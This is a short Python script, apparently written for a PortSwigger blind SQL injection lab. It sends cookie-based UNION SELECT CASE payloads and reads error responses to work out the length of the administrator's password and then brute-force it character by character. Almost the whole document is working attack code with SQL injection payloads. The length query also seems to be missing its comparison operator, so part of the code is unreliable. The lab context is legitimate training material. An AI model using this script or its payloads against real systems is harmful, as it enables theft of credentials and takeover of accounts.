#this script for portswigger blind sql injection conditional response challange
import requests
import string
a='abcdefghijklmnopqrstuvwxyz1234567890'
z=''
length=int(input('input max length to password :'))+int(1)
r = '<Response [500]>'
url=input('Put Your URL Buddy:')
while r == "<Response [500]>" :
    for z in range(1,length,1):
        cookie = dict(TrackingId='x\'+UNION+SELECT+CASE+WHEN+(username=\'administrator\' and length(password)'+str(z)+')+THEN+to_char(1/0)+ELSE+NULL+END+FROM+users--')
        r =requests.get(url=url, cookies=cookie)
        x = int(z)+int(1)
print('Password Length = '+str(z))
print('Now BruteForcing The password Please Wait')
password=''
while int(len(password)) != int(x)-int(1) :
    for i in range(1,x,1):
        for j in a :
            cookie = dict(TrackingId='x\'+UNION+SELECT+CASE+WHEN+(username=\'administrator\' and substr(password,'+str(i)+',1)=\''+j+'\')+THEN+to_char(1/0)+ELSE+NULL+END+FROM+users--')
            r =str(requests.get(url=url, cookies=cookie))
            if r == "<Response [500]>" :
                password += j
                print('Found More Character : '+password)
                break
print('Password is '+password)
            
